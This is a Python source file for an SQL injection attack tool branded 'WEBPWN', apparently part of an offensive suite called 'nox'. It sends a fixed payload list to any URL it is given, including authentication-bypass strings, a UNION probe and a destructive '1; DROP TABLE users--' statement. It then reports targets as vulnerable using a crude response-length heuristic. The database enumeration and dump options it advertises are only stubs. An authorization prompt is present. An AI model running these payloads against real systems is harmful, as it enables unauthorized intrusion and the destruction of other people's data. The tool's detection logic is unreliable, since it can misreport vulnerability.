import sys
import argparse
import os
from rich.console import Console
from utils.banner import print_nox_banner
from utils.logger import setup_logger, audit_log
from utils.formatter import format_output
import datetime
import getpass

console = Console()
logger = setup_logger("webpwn_sqlix")

# --- Identity ---
TOOL_NAME = "WEBPWN"
TOOL_VERSION = "1.0.0"
TOOL_DESCRIPTION = "Web Application Attack Suite - SQL Injection"

# --- Banner Config ---
BORDER = "orange_red1"
NAME_COLOR = "bold orange_red1"
FILL_COLOR = "red1"
TAG_COLOR = "light_coral"
FCHAR = "▸"

ART_LINES = [
    "  ██     ██ ███████ █████   ███  ██   ██ ███    ██ ",
    "  ██     ██ ██      ██  ██ ██ ██ ██   ██ ████   ██ ",
    "  ██  █  ██ █████   ██████ ██ ██ ██   ██ ██ ██  ██ ",
    "  ██ ███ ██ ██      ██  ██ ██ ██ ██   ██ ██  ██ ██ ",
    "   ███ ███  ███████ ██  ██  ███  ███████ ██   ████ ",
]

def main():
    parser = argparse.ArgumentParser(
        description=TOOL_DESCRIPTION,
        prog="nox webpwn sqlix"
    )
    
    # Target Configuration
    parser.add_argument("--url", required=True, help="Target URL parameter to test")
    parser.add_argument("--parameter", help="Specific parameter to test (e.g., id, username)")
    parser.add_argument("--method", choices=["GET", "POST"], default="GET", help="HTTP method")
    
    # Enumeration Options
    parser.add_argument("--enum-dbs", action="store_true", help="Enumerate databases")
    parser.add_argument("--enum-tables", help="Enumerate tables from database")
    parser.add_argument("--dump", help="Dump data from table")
    parser.add_argument("--all", action="store_true", help="Full database dump")
    
    # Output Options
    parser.add_argument("--output", choices=["json", "csv", "txt"], default="json", help="Output format")
    parser.add_argument("--out-file", help="Save results to file")
    
    # Standards
    parser.add_argument("--confirm-legal", action="store_true", help="Confirm authorized use")
    
    args = parser.parse_args()

    # Step 1: Banner
    print_nox_banner(TOOL_NAME, TOOL_VERSION, TOOL_DESCRIPTION, BORDER, NAME_COLOR, FILL_COLOR, FCHAR, TAG_COLOR, ART_LINES)

    # Step 2: Legal Check
    if not args.confirm_legal:
        console.print("[bold yellow]⚠ Legal Confirmation Required[/bold yellow]")
        confirm = input("Confirm you have authorization to test this target (yes/no): ").lower()
        if confirm != 'yes':
            console.print("[bold red]Aborting. Authorized use only.[/bold red]")
            sys.exit(1)

    # Step 3: Run Logic
    run_sqlix(args)

def run_sqlix(args):
    """Core logic for SQL injection testing."""
    import requests
    from urllib.parse import urlparse, parse_qs
    
    console.print(f"[*] Testing for SQL Injection on: [bold white]{args.url}[/bold white]")
    logger.info(f"SQLi testing started: url={args.url}")
    
    results = {
        "url": args.url,
        "vulnerable": False,
        "findings": [],
        "payloads_tested": [],
        "timestamp": datetime.datetime.now().isoformat()
    }
    
    # Common SQL injection test payloads
    test_payloads = [
        "1' OR '1'='1",
        "admin' --",
        "1; DROP TABLE users--",
        "' UNION SELECT NULL--",
        "1 AND 1=1",
        "1 AND 1=2",
    ]
    
    console.print("[*] Sending test payloads...")
    
    try:
        # Test basic connectivity first
        response = requests.get(args.url, timeout=5)
        baseline_response = response.text
        baseline_length = len(baseline_response)
        
        for payload in test_payloads:
            results["payloads_tested"].append(payload)
            try:
                if args.method == "POST":
                    test_response = requests.post(args.url, data={"id": payload}, timeout=5)
                else:
                    test_url = f"{args.url}?id={payload}"
                    test_response = requests.get(test_url, timeout=5)
                
                # Simple heuristics for SQLi detection
                response_diff = abs(len(test_response.text) - baseline_length)
                if response_diff > 100 or "SQL" in test_response.text or "mysql_" in test_response.text:
                    results["vulnerable"] = True
                    results["findings"].append(f"Parameter appears vulnerable: {payload}")
                    console.print(f"  [!] Potential SQLi detected: {payload}")
                else:
                    console.print(f"  [*] Tested: {payload}")
            except Exception as e:
                console.print(f"  [*] Tested: {payload}")
    
    except Exception as e:
        console.print(f"[!] Connection error: {e}")
        results["findings"].append(f"Connection error: {e}")
    
    if args.enum_dbs:
        console.print("[*] Enumerating databases...")
        results["findings"].append("Database enumeration would require successful SQLi exploitation")
    
    console.print(f"\n[bold green][+] Testing complete{' - VULNERABLE' if results['vulnerable'] else ''}[/bold green]")
    
    if args.out_file:
        format_output(results, args.output, args.out_file)
        console.print(f"[bold cyan]Results saved to: {args.out_file}[/bold cyan]")
    else:
        console.print("[*] Results:")
        import json
        console.print(json.dumps(results, indent=2))
    
    audit_log(logger, getpass.getuser(), args.url, "webpwn/sqlix", str(args), "SUCCESS")

if __name__ == "__main__":
    main()
